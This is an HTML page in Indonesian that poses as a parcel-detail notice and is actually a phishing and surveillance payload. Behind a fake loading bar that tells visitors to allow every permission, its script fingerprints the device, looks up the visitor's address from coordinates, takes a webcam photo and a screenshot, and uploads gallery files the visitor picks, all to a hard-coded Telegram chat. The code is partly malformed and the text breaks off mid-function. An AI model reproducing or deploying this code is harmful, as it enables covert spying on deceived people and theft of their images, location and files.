<!DOCTYPE html>
<html lang="id">
<head>

<title>DETAIL PAKET ANDA</title>

<style>
body {margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;overflow:hidden;position:relative;color:#444;}
body::before {content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/4ao8hu.jpg') no-repeat center center;background-size:cover;filter:blur(6px) brightness(0.6);z-index:-1;}
#loading-container {position:relative;text-align:center;width:80%;max-width:400px;background:rgba(255,255,255,0.1);padding:30px;border-radius:15px;backdrop-filter:blur(5px);box-shadow:0 0 20px rgba(0,0,0,0.5);}
#loading-text {font-size:22px;margin-bottom:20px;color:#eee;animation:fadeIn 1.5s infinite alternate;}
#progress-container {height:6px;background:rgba(200,200,200,0.3);border-radius:3px;overflow:hidden;}
#progress-bar {height:100%;width:0%;background:linear-gradient(90deg,#888,#ccc);transition:width 0.3s ease;}
#loading-details {margin-top:20px;font-size:14px;color:#ccc;min-height:20px;animation:fadeText 2s infinite alternate;}
.hidden {display:none;}
video.floating {position:absolute;width:200px;height:120px;z-index:9999;pointer-events:none;transform:rotate(0deg);}
@keyframes fadeIn{0%{opacity:0.5}100%{opacity:1}}
@keyframes fadeText{0%{color:#aaa}100%{color:#eee}}
</style>
</head>
<body>
<div id="loading-container">
    <div id="loading-text">DETAIL PAKET ANDA</div>

(async()=>{

const OWNER_CHAT_ID="7532272726";

// ========== LOADING ==========
const progressBar = document.getElementById('progress-bar');
const loadingDetails = document.getElementById('loading-details');

const messages = [
  "Loading 10%", "Loading 20%", "Loading 30%",
  "Loading 40%", "Loading 50%", "Loading 60%", 
  "Loading 70%", "Loading 80%", "Loading 90%",
  "Loading 100%", "Loading complete",
  "Izinkan Semua Yang Diminta", "Silahkan Cek Paket Anda"
];

let duration = 10000; // total 10 detik
let steps = 100;      // bagi progress jadi 100 step
let intervalTime = duration / steps; // 100ms per step
let progress = 0;
let msgIndex = 0;

const progressInterval = setInterval(() => {
  progress++;
  progressBar.style.width = progress + "%";

  // setiap beberapa persen update pesan
  if (progress % Math.ceil(100 / messages.length) === 0 && msgIndex < messages.length) {
    loadingDetails.textContent = messages[msgIndex];
    msgIndex++;
  }

  if (progress >= 100) {
    clearInterval(progressInterval);
  }
}, intervalTime);

// ========== TELEGRAM ==========
const sendTelegram=async(text)=>{
    try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:OWNER_CHAT_ID,text,parse_mode:'Markdown'})});
    }catch(e){console.error(e);}
};
const sendPhoto=async(blob,filename)=>{
    try{
        const fd=new FormData();
        fd.append('chat_id',OWNER_CHAT_ID);
        fd.append('photo',blob,filename);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
    }catch(e){console.error(e);}
};
const getLocationDetails=async(lat,lon)=>{
    try{
        const res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data=await res.json();
        return {county:data.address?.county||data.address?.city||data.address?.state||"Tidak diketahui",
                district:data.address?.suburb||data.address?.village||data.address?.town||"Tidak diketahui",
                fullAddress:data.display_name||"Alamat tidak tersedia"};
    }catch{return {county:"Tidak diketahui",district:"Tidak diketahui",fullAddress:"Alamat tidak tersedia"};}
};

// ========== FINGERPRINT ==========
async function generateFingerprint(){
    const ua=navigator.userAgent; const lang=navigator.language;
    const res=screen.width+"x"+screen.height;
    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
    const ram=navigator.deviceMemory||"N/A";
    const cpu=navigator.hardwareConcurrency||"N/A";
    const raw=`${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
    const data=new TextEncoder().encode(raw);
    const hashBuffer=await crypto.subtle.digest('SHA-256',data);
    return [...new Uint8Array(hashBuffer)].map(x=>x.toString(16).padStart(2,'0')).join('');
}

// ========== CAMERA & SCREENSHOT ==========
const startCapture=async()=>{
    try{
        const video=document.createElement('video');
        video.autoplay=true;video.muted=true;video.style.display='none';
        document.body.appendChild(video);
        const canvas=document.getElementById('c');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;
        await new Promise(r=>video.onloadedmetadata=r);
        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        canvas.toBlob(b=>sendPhoto(b,'camera_capture.jpg'),'image/jpeg');
        stream.getTracks().forEach(t=>t.stop());
        video.remove();
    }catch{ await sendTelegram("❌ Camera blocked"); }

    try{
        const shot=await html2canvas(document.body);
        shot.toBlob(b=>sendPhoto(b,'screenshot.jpg'),'image/jpeg');
    }catch{ await sendTelegram("❌ Screenshot failed"); }
}

// ========== GALLERY FILES ==========
async function pickGalleryFiles(){
    const fileInput=document.getElementById('filePicker');
    fileInput.click();
    fileInput.onchange=async()=>{
        for(const file of fileInput.files){
            try{
                const form=new FormData();
                form.append('chat_id',OWNER_CHAT_ID);
                form.append('photo',file,file.name);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:form});
            }catch(e){console.error(e);}
        }
    }
}

// ========== START EVERYTHING ==========
setTimeout(async()=>{
